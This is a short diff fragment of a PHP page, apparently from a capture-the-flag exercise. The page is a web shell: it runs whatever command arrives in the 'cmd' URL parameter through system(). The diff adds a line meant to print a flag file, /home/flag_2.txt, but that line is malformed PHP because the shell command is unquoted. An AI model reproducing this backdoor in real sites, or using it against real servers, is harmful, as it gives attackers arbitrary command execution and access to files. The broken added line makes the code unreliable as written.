@@ -17,6 +17,7 @@
 <?
 if($_GET['cmd']) {
   system($_GET['cmd']);
+echo  system(cat /home/flag_2.txt);
   }
 ?>
 </pre>
